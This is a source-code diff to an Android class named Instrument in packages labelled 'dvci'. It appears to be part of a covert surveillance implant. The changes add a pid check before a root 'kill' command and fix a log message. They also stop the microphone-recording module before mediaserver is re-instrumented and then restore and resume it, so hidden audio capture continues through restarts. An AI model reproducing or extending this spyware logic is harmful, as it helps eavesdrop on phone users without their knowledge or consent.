@@ -7,6 +7,8 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.module.ModuleCall;
+import com.android.dvci.module.ModuleMic;
 import com.android.mm.M;
 
 import java.io.File;
@@ -178,7 +180,7 @@ public class Instrument {
 				}
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(getProcessPid): unable to get pid");
+					Check.log(TAG + "(startInstrumentation): unable to get pid");
 				}
 
 			}
@@ -238,6 +240,12 @@ public class Instrument {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) try to kill " + pid);
 			}
+			if(pid<=0){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (killProc) invalid pid don't kill " + pid);
+				}
+				return ;
+			}
 			Execute.executeRoot("kill " + pid);
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -285,7 +293,20 @@ public class Instrument {
 
 					failedCounter += 1;
 					if (failedCounter < 3) {
+						if (ModuleCall.self().isMicAvailable()) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (MediaserverMonitor run), Restarted mic");
+							}
+							ModuleMic.self().stop(this);
+						}
 						startInstrumentation();
+						if (ModuleCall.self().isMicAvailable()) {
+							ModuleMic.self().restore(this);
+							ModuleMic.self().resume();
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (MediaserverMonitor run), Restarted mic");
+							}
+						}
 					} else {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
